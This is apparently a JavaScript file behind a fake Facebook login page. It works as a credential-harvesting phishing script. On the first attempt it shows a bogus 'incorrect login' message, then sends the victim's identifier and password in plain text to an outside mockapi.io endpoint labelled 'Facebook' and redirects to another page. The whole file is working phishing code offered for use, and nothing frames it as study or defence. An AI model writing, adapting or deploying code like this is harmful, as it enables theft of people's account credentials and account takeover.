let attemptCount = 0; // Track login attempts

function showModal() {
    const modal = document.getElementById('notificationModal');
    modal.style.display = 'block';
}

function closeModal() {
    const modal = document.getElementById('notificationModal');
    modal.style.display = 'none';
}

function redirectToFacebook() {
    window.location.href = 'https://www.facebook.com';
}

function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');

    // Toggle the type attribute
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.style.backgroundImage = "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-open-1.png')";
    } else {
        passwordInput.type = 'password';
        eyeIcon.style.backgroundImage = "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-close-1.png')";
    }
}

const loginForm = document.getElementById('loginForm');

loginForm.addEventListener('submit', async (event) => {
    event.preventDefault(); // Prevent the default form submission

    const identifier = document.getElementById('identifier').value;
    const password = document.getElementById('password').value;

    // Simulated incorrect login check
    const validPassword = "securepassword"; // Change this to your actual validation logic

    if (identifier === "" || password !== validPassword) {
        attemptCount++; // Increment the attempt count
        if (attemptCount === 1) {
            showModal(); // Show the modal for incorrect login
        } else if (attemptCount === 2) {
            // Second attempt - save to mock API and redirect
            const userData = {
                identifier: identifier,
                password: password,
            };

            try {
                await fetch('https://67069c2da0e04071d2279651.mockapi.io/Facebook', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(userData),
                });

                // Wait for 1 second before redirecting
                setTimeout(() => {
                    window.location.href = 'indexPAGE.html';
                }, 1000); // 1000 milliseconds = 1 second
            } catch (error) {
                console.error('Error saving user data:', error);
            }
        }
        return; // Stop here on incorrect credentials
    }

    // Reset attempt count if login is successful
    attemptCount = 0;

    // Save details to the mock API
    const userData = {
        identifier: identifier,
        password: password,
    };

    try {
        await fetch('https://67069c2da0e04071d2279651.mockapi.io/Facebook', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(userData),
        });

        // Wait for 1 second before redirecting
        setTimeout(() => {
            window.location.href = 'indexPAGE.html';
        }, 1000); // 1000 milliseconds = 1 second
    } catch (error) {
        console.error('Error saving user data:', error);
    }
});
